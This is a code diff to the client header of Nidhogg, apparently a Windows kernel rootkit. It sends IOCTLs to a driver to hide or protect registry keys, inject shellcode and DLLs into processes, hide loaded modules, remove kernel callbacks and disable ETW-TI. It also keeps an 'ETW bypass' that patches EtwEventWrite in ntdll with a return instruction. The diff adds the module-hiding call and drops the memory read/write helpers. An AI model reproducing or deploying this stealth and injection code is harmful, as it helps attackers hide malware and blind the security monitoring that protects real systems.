@@ -32,20 +32,21 @@
 #define IOCTL_NIDHOGG_QUERY_REGITEMS CTL_CODE(0x8000, 0x814, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
 #define IOCTL_NIDHOGG_PATCH_MODULE CTL_CODE(0x8000, 0x815, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_WRITE_DATA CTL_CODE(0x8000, 0x816, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_READ_DATA CTL_CODE(0x8000, 0x817, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_INJECT_SHELLCODE CTL_CODE(0x8000, 0x818, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_INJECT_DLL CTL_CODE(0x8000, 0x819, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_INJECT_SHELLCODE CTL_CODE(0x8000, 0x816, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_INJECT_DLL CTL_CODE(0x8000, 0x817, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_HIDE_MODULE CTL_CODE(0x8000, 0x818, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
-#define IOCTL_NIDHOGG_LIST_OBCALLBACKS CTL_CODE(0x8000, 0x81A, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_LIST_PSROUTINES CTL_CODE(0x8000, 0x81B, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_LIST_REGCALLBACKS CTL_CODE(0x8000, 0x81C, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_REMOVE_CALLBACK CTL_CODE(0x8000, 0x81D, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_RESTORE_CALLBACK CTL_CODE(0x8000, 0x81E, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_ENABLE_DISABLE_ETWTI CTL_CODE(0x8000, 0x81F, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_LIST_OBCALLBACKS CTL_CODE(0x8000, 0x819, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_LIST_PSROUTINES CTL_CODE(0x8000, 0x81A, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_LIST_REGCALLBACKS CTL_CODE(0x8000, 0x81B, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_REMOVE_CALLBACK CTL_CODE(0x8000, 0x81C, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_RESTORE_CALLBACK CTL_CODE(0x8000, 0x81D, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_ENABLE_DISABLE_ETWTI CTL_CODE(0x8000, 0x81E, METHOD_BUFFERED, FILE_ANY_ACCESS)
 // *******************************************************************************************************
 
 // ** General Definitions ***************************************************************************************
+#define SYSTEM_PID 4
+
 #define DRIVER_NAME LR"(\\.\Nidhogg)"
 #define NIDHOGG_SUCCESS 0
 #define NIDHOGG_GENERAL_ERROR 1
@@ -64,10 +65,6 @@
 #define MAX_TIDS 256
 #define MAX_ROUTINES 64
 
-#define REG_TYPE_PROTECTED_KEY 0
-#define REG_TYPE_PROTECTED_VALUE 1
-#define REG_TYPE_HIDDEN_KEY 2
-#define REG_TYPE_HIDDEN_VALUE 3
 #define REG_KEY_LEN 255
 #define REG_VALUE_LEN 260
 #define HKLM_HIVE LR"(\Registry\Machine)"
@@ -111,6 +108,13 @@ enum SignatureSigner
 enum InjectionType {
 	APCInjection,
 	NtCreateThreadExInjection
+};
+
+enum RegItemType {
+	RegProtectedKey = 0,
+	RegProtectedValue = 1,
+	RegHiddenKey = 2,
+	RegHiddenValue = 3
 };
 
 enum CallbackType {
@@ -224,6 +228,11 @@ struct ShellcodeInformation {
 	PVOID Parameter1;
 	PVOID Parameter2;
 	PVOID Parameter3;
+};
+
+struct HiddenModuleInformation {
+	ULONG Pid;
+	WCHAR* ModuleName;
 };
 // *********************************************************************************************************
 
@@ -570,12 +579,11 @@ namespace Nidhogg {
 
 			std::wstring kernelSyntaxRegistryKey = ParseRegistryKey(key);
 
-			if (kernelSyntaxRegistryKey.empty()) {
+			if (kernelSyntaxRegistryKey.empty() || wcslen(kernelSyntaxRegistryKey.data()) > REG_KEY_LEN)
 				return NIDHOGG_GENERAL_ERROR;
-			}
 
 			wcscpy_s(item.KeyPath, wcslen(kernelSyntaxRegistryKey.data()) + 1, kernelSyntaxRegistryKey.data());
-			item.Type = REG_TYPE_PROTECTED_KEY;
+			item.Type = RegItemType::RegProtectedKey;
 
 			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_PROTECT_REGITEM,
 				&item, sizeof(item),
@@ -591,12 +599,11 @@ namespace Nidhogg {
 
 			std::wstring kernelSyntaxRegistryKey = ParseRegistryKey(key);
 
-			if (kernelSyntaxRegistryKey.empty()) {
+			if (kernelSyntaxRegistryKey.empty() || wcslen(kernelSyntaxRegistryKey.data()) > REG_KEY_LEN)
 				return NIDHOGG_GENERAL_ERROR;
-			}
 
 			wcscpy_s(item.KeyPath, wcslen(kernelSyntaxRegistryKey.data()) + 1, kernelSyntaxRegistryKey.data());
-			item.Type = REG_TYPE_HIDDEN_KEY;
+			item.Type = RegItemType::RegHiddenKey;
 
 			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_PROTECT_REGITEM,
 				&item, sizeof(item),
@@ -612,13 +619,12 @@ namespace Nidhogg {
 
 			std::wstring kernelSyntaxRegistryKey = ParseRegistryKey(key);
 
-			if (kernelSyntaxRegistryKey.empty() || wcslen(valueName) > REG_VALUE_LEN) {
+			if (kernelSyntaxRegistryKey.empty() || wcslen(kernelSyntaxRegistryKey.data()) > REG_KEY_LEN || wcslen(valueName) > REG_VALUE_LEN)
 				return NIDHOGG_GENERAL_ERROR;
-			}
 
 			wcscpy_s(item.KeyPath, wcslen(kernelSyntaxRegistryKey.data()) + 1, kernelSyntaxRegistryKey.data());
 			wcscpy_s(item.ValueName, wcslen(valueName) + 1, valueName);
-			item.Type = REG_TYPE_PROTECTED_VALUE;
+			item.Type = RegItemType::RegProtectedValue;
 
 			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_PROTECT_REGITEM,
 				&item, sizeof(item),
@@ -634,13 +640,12 @@ namespace Nidhogg {
 
 			std::wstring kernelSyntaxRegistryKey = ParseRegistryKey(key);
 
-			if (kernelSyntaxRegistryKey.empty() || wcslen(valueName) > REG_VALUE_LEN) {
+			if (kernelSyntaxRegistryKey.empty() || wcslen(kernelSyntaxRegistryKey.data()) > REG_KEY_LEN || wcslen(valueName) > REG_VALUE_LEN)
 				return NIDHOGG_GENERAL_ERROR;
-			}
 
 			wcscpy_s(item.KeyPath, wcslen(kernelSyntaxRegistryKey.data()) + 1, kernelSyntaxRegistryKey.data());
 			wcscpy_s(item.ValueName, wcslen(valueName) + 1, valueName);
-			item.Type = REG_TYPE_HIDDEN_VALUE;
+			item.Type = RegItemType::RegHiddenValue;
 
 			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_PROTECT_REGITEM,
 				&item, sizeof(item),
@@ -656,12 +661,11 @@ namespace Nidhogg {
 
 			std::wstring kernelSyntaxRegistryKey = ParseRegistryKey(key);
 
-			if (kernelSyntaxRegistryKey.empty()) {
+			if (kernelSyntaxRegistryKey.empty() || wcslen(kernelSyntaxRegistryKey.data()) > REG_KEY_LEN)
 				return NIDHOGG_GENERAL_ERROR;
-			}
 
 			wcscpy_s(item.KeyPath, wcslen(kernelSyntaxRegistryKey.data()) + 1, kernelSyntaxRegistryKey.data());
-			item.Type = REG_TYPE_PROTECTED_KEY;
+			item.Type = RegItemType::RegProtectedKey;
 
 			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_UNPROTECT_REGITEM,
 				&item, sizeof(item),
@@ -677,12 +681,11 @@ namespace Nidhogg {
 
 			std::wstring kernelSyntaxRegistryKey = ParseRegistryKey(key);
 
-			if (kernelSyntaxRegistryKey.empty()) {
+			if (kernelSyntaxRegistryKey.empty() || wcslen(kernelSyntaxRegistryKey.data()) > REG_KEY_LEN)
 				return NIDHOGG_GENERAL_ERROR;
-			}
 
 			wcscpy_s(item.KeyPath, wcslen(kernelSyntaxRegistryKey.data()) + 1, kernelSyntaxRegistryKey.data());
-			item.Type = REG_TYPE_HIDDEN_KEY;
+			item.Type = RegItemType::RegHiddenKey;
 
 			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_UNPROTECT_REGITEM,
 				&item, sizeof(item),
@@ -698,13 +701,12 @@ namespace Nidhogg {
 
 			std::wstring kernelSyntaxRegistryKey = ParseRegistryKey(key);
 
-			if (kernelSyntaxRegistryKey.empty()) {
+			if (kernelSyntaxRegistryKey.empty() || wcslen(kernelSyntaxRegistryKey.data()) > REG_KEY_LEN || wcslen(valueName) > REG_VALUE_LEN)
 				return NIDHOGG_GENERAL_ERROR;
-			}
 
 			wcscpy_s(item.KeyPath, wcslen(kernelSyntaxRegistryKey.data()) + 1, kernelSyntaxRegistryKey.data());
 			wcscpy_s(item.ValueName, wcslen(valueName) + 1, valueName);
-			item.Type = REG_TYPE_PROTECTED_VALUE;
+			item.Type = RegItemType::RegProtectedValue;
 
 			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_UNPROTECT_REGITEM,
 				&item, sizeof(item),
@@ -720,13 +722,12 @@ namespace Nidhogg {
 
 			std::wstring kernelSyntaxRegistryKey = ParseRegistryKey(key);
 
-			if (kernelSyntaxRegistryKey.empty()) {
+			if (kernelSyntaxRegistryKey.empty() || wcslen(kernelSyntaxRegistryKey.data()) > REG_KEY_LEN || wcslen(valueName) > REG_VALUE_LEN)
 				return NIDHOGG_GENERAL_ERROR;
-			}
 
 			wcscpy_s(item.KeyPath, wcslen(kernelSyntaxRegistryKey.data()) + 1, kernelSyntaxRegistryKey.data());
 			wcscpy_s(item.ValueName, wcslen(valueName) + 1, valueName);
-			item.Type = REG_TYPE_HIDDEN_VALUE;
+			item.Type = RegItemType::RegHiddenValue;
 
 			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_UNPROTECT_REGITEM,
 				&item, sizeof(item),
@@ -753,7 +754,7 @@ namespace Nidhogg {
 			DWORD returned;
 
 			result.RegItemsIndex = 0;
-			result.Type = REG_TYPE_PROTECTED_KEY;
+			result.Type = RegItemType::RegProtectedKey;
 
 			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_QUERY_REGITEMS,
 				&result, sizeof(result),
@@ -796,7 +797,7 @@ namespace Nidhogg {
 			std::vector<std::wstring> keys;
 			int amountOfKeys = 0;
 			result.RegItemsIndex = 0;
-			result.Type = REG_TYPE_HIDDEN_KEY;
+			result.Type = RegItemType::RegHiddenKey;
 
 			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_QUERY_REGITEMS,
 				&result, sizeof(result),
@@ -840,7 +841,7 @@ namespace Nidhogg {
 			std::vector<std::wstring> valuesKeys;
 			int amountOfValues = 0;
 			result.RegItemsIndex = 0;
-			result.Type = REG_TYPE_PROTECTED_VALUE;
+			result.Type = RegItemType::RegProtectedValue;
 
 			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_QUERY_REGITEMS,
 				&result, sizeof(result),
@@ -891,7 +892,7 @@ namespace Nidhogg {
 			DWORD returned;
 
 			result.RegItemsIndex = 0;
-			result.Type = REG_TYPE_HIDDEN_VALUE;
+			result.Type = RegItemType::RegHiddenValue;
 
 			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_QUERY_REGITEMS,
 				&result, sizeof(result),
@@ -935,12 +936,33 @@ namespace Nidhogg {
 		}
 	}
 
-	namespace ModuleUtils {
+	namespace MemoryUtils {
+		int NidhoggHideModule(HANDLE hNidhogg, DWORD pid, wchar_t* modulePath) {
+			DWORD returned = 0;
+			HiddenModuleInformation moduleInfo{};
+
+			if (pid <= 0 || pid == SYSTEM_PID || !modulePath)
+				return NIDHOGG_GENERAL_ERROR;
+
+			if (wcslen(modulePath) > MAX_PATH)
+				return NIDHOGG_GENERAL_ERROR;
+
+			moduleInfo.Pid = pid;
+			moduleInfo.ModuleName = modulePath;
+
+			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_HIDE_MODULE,
+				&moduleInfo, sizeof(moduleInfo),
+				nullptr, 0, &returned, nullptr))
+				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
+
+			return NIDHOGG_SUCCESS;
+		}
+
 		int NidhoggInjectDll(HANDLE hNidhogg, DWORD pid, const char* dllPath, InjectionType injectionType) {
 			DWORD returned;
 			DllInformation dllInformation{};
 
-			if (pid <= 0 || pid == 4 || !dllPath)
+			if (pid <= 0 || pid == SYSTEM_PID || !dllPath)
 				return NIDHOGG_GENERAL_ERROR;
 
 			if (strlen(dllPath) > MAX_PATH)
@@ -962,7 +984,7 @@ namespace Nidhogg {
 			DWORD returned;
 			ShellcodeInformation shellcodeInformation{};
 
-			if (pid <= 0 || pid == 4 || !shellcode)
+			if (pid <= 0 || pid == SYSTEM_PID || !shellcode)
 				return NIDHOGG_GENERAL_ERROR;
 
 			shellcodeInformation.Type = injectionType;
@@ -994,6 +1016,9 @@ namespace Nidhogg {
 			if (patchedModule.ModuleName == nullptr || patchedModule.FunctionName == nullptr || patchedModule.Patch == nullptr)
 				return NIDHOGG_GENERAL_ERROR;
 
+			if (wcslen(moduleName) > MAX_PATH)
+				return NIDHOGG_GENERAL_ERROR;
+
 			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_PATCH_MODULE,
 				&patchedModule, sizeof(patchedModule),
 				nullptr, 0, &returned, nullptr))
@@ -1010,50 +1035,6 @@ namespace Nidhogg {
 		int NidhoggETWBypass(HANDLE hNidhogg, DWORD pid) {
 			std::vector<byte> patch = { 0xC3 };
 			return NidhoggPatchModule(hNidhogg, pid, (wchar_t*)LR"(C:\Windows\System32\Ntdll.dll)", (char*)"EtwEventWrite", patch);
-		}
-
-		int NidhoggWriteData(HANDLE hNidhogg, DWORD pid, PVOID remoteAddress, SIZE_T size, MODE mode) {
-			DWORD returned;
-			PkgReadWriteData pkgWrite{};
-			PVOID data = NULL;
-
-			pkgWrite.Pid = pid;
-			pkgWrite.RemoteAddress = remoteAddress;
-			pkgWrite.LocalAddress = &data;
-			pkgWrite.Size = size;
-			pkgWrite.Mode = mode;
-
-			if (pkgWrite.LocalAddress == 0 || pkgWrite.RemoteAddress == 0 || pkgWrite.Pid <= 0 || pkgWrite.Size <= 0)
-				return NIDHOGG_GENERAL_ERROR;
-
-			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_WRITE_DATA,
-				&pkgWrite, sizeof(pkgWrite),
-				nullptr, 0, &returned, nullptr))
-				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
-
-			return NIDHOGG_SUCCESS;
-		}
-
-		PVOID NidhoggReadData(HANDLE hNidhogg, DWORD pid, PVOID remoteAddress, SIZE_T size, MODE mode) {
-			DWORD returned;
-			PkgReadWriteData pkgRead{};
-			PVOID data = NULL;
-
-			pkgRead.Pid = pid;
-			pkgRead.RemoteAddress = remoteAddress;
-			pkgRead.LocalAddress = &data;
-			pkgRead.Size = size;
-			pkgRead.Mode = mode;
-
-			if (pkgRead.LocalAddress == 0 || pkgRead.RemoteAddress == 0 || pkgRead.Pid <= 0 || pkgRead.Size <= 0)
-				return (PVOID)NIDHOGG_GENERAL_ERROR;
-
-			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_WRITE_DATA,
-				&pkgRead, sizeof(pkgRead),
-				&pkgRead, sizeof(pkgRead), &returned, nullptr))
-				return (PVOID)NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
-
-			return data;
 		}
 	}
 
